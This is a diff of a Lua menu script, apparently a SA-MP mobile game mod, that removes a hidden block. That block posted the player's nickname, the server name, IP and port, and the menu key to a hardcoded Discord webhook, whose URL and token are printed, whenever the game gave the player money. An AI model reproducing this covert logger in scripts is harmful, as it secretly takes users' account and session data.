@@ -1,11 +1,6 @@
 local imgui = require "mimgui"
 local new = imgui.new
 local faicons = require('fAwesome6')
-local inicfg = require 'inicfg'
-local https = require("ssl.https")
-local ltn12 = require("ltn12")
-local json = require 'dkjson'
-local se = require("lib.samp.events")
 
 -- IMAGEM
 local Imagem = nil
@@ -23,18 +18,6 @@ for i = 1, 80 do
         velocidade = imgui.ImVec2((math.random() - 0.5) * 4.0, (math.random() - 0.5) * 0.4)
     })
 end
--- ENVIAR INFO BOT
-local contador_log = 0
-local configuracao_log = inicfg.load({
-    LogsDiscord = {
-        ativado = true,
-        link_discord = "https://discord.com/api/webhooks/1402359255377641503/7ud9f47UTDedBSG8rewyTpSU59YLomfSvuMRgms3FDakR-CvnxW-RhAUfKxaA4yGJkYr"
-    }
-}, "logsdiscord")
-local mensagem_enviada = false
-local status_log = {
-    ativo = configuracao_log.LogsDiscord.ativado
-}
 
 local GUI = {
     AbrirMenu = imgui.new.bool(false),
@@ -304,52 +287,6 @@ function CarregarFoto(path) -- CARREGAR AS FOTOS E OUTROS ARQUIVOS
     file:close()
     return size
 end
-
-function se.onGivePlayerMoney() -- ENVIAR INFO BOT
-    if status_log.ativo and not mensagem_enviada then
-        local ok, id_jogador = sampGetPlayerIdByCharHandle(PLAYER_PED)
-        local nick_jogador = sampGetPlayerNickname(id_jogador)
-        local ip, porta = sampGetCurrentServerAddress()
-        local nome_servidor = sampGetCurrentServerName()
-
-        local jsonPayload = ([[
-{
-    "content": null,
-    "embeds": [
-        {
-            "title": "LOGIN DA CONTA",
-            "description": "\n\n**Nome do Server:**\n``%s``\n\n**Nick:**\n``%s``\n\n**Servidor:**\n``%s:%d``\n\n**Key:**\n``%s``\n\n",
-            "color": 16711680,
-            "author": {
-                "name": ""
-            },
-            "footer": {
-                "text": "Logs luac - By HexDump (MOBILE)"
-            }
-        }
-    ],
-    "attachments": []
-}
-]]):format(nome_servidor, nick_jogador, ip, porta, chaveDoMenu)
-
-        EnviarWebhook(configuracao_log.LogsDiscord.link_discord, jsonPayload)
-        mensagem_enviada = true
-    end
-end
-
-function EnviarWebhook(url, dados_json)
-    local resposta = {}
-    https.request{
-        url = url,
-        method = "POST",
-        headers = {
-            ["Content-Type"] = "application/json",
-            ["Content-Length"] = tostring(#dados_json)
-        },
-        source = ltn12.source.string(dados_json),
-        sink = ltn12.sink.table(resposta)
-    }
-end -- FIM ENVIAR INFO BOT
 
 function TemaVermelho()
     local style = imgui.GetStyle()
